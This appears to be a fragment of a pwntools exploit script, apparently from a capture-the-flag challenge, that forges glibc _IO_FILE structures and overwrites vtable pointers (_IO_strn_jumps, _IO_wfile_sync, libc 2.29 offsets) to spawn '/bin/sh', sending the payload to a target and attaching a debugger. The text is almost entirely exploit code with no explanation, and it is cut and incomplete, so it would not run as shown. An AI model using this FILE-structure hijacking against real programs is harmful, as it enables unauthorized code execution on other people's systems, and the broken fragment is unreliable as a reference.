...
fd = fit({
		...
		0xc0: p64(0xffffffffffffffff),
		0xd8: flat(vtable+96-0x18),
	},filler=(ord('\x00'),))

r.sendlineafter('buf:', buf)
gdb.attach(r, 'b *_IO_wfile_sync+11\nc')
...
''' libc2.29
vtable1 = libc_base + 0x1e6080          # _IO_strn_jumps
fd = fit({ # rdi
           0x8: flat(1),
           0x28: flat(1), 
           0x38: flat(sh), # _IO_buf_base
           0x98: flat(buf+0xc8), #r12
           0xa0: flat(buf), # rax
           0xc8: flat('/bin/sh'),
           0xd8: flat(vtable1-0x18),
